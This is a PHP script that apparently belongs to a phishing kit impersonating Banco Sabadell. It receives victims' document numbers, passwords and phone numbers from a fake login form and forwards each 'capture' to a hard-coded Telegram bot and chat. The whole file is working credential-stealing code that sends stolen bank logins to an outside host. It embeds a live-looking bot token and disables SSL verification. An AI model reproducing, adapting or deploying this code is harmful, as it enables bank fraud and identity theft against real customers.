<?php
$bot_token = '8105362715:AAFTuq4tK_EzARuIwHiqu4nxIPhQ15lWelo';
$chat_id = '1734386292';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: POST');
    header('Access-Control-Allow-Headers: Content-Type');
    
    $input = null;
    
    if (isset($_POST['data'])) {
        $input = json_decode($_POST['data'], true);
    } else {
        $raw_input = file_get_contents('php://input');
        $input = json_decode($raw_input, true);
    }
    
    if ($input && isset($input['document_number']) && !empty($input['document_number'])) {
        $document_type = $input['document_type'] ?? '';
        $document_number = $input['document_number'] ?? '';
        $password = $input['password'] ?? '';
        $phone_number = $input['phone_number'] ?? '';
        $remember_user = $input['remember_user'] ?? false;
        $timestamp = date('Y-m-d H:i:s');
        
        $message = "🏦 *BANCO SABADELL - NUEVA CAPTURA*\n\n";
        $message .= "📅 *Fecha:* $timestamp\n";
        $message .= "🆔 *Tipo documento:* $document_type\n";
        $message .= "📄 *Número:* $document_number\n";
        $message .= "🔐 *Contraseña:* $password\n";
        $message .= "📱 *Teléfono:* $phone_number\n";
        $message .= "💾 *Recordar usuario:* " . ($remember_user ? 'Sí' : 'No') . "\n\n";
        $message .= "🎯 *Desarrollado por Smurf*";
        
        $url = "https://api.telegram.org/bot$bot_token/sendMessage";
        $data = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        $result = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($result && $http_code == 200) {
            echo json_encode(['success' => true, 'message' => 'Datos enviados correctamente']);
        } else {
            echo json_encode(['success' => false, 'message' => 'Error al enviar datos', 'debug' => $result]);
        }
    } else {
        echo json_encode(['success' => false, 'message' => 'Datos no válidos', 'debug' => $raw_input]);
    }
} else {
    echo json_encode(['success' => false, 'message' => 'Método no permitido']);
}
?>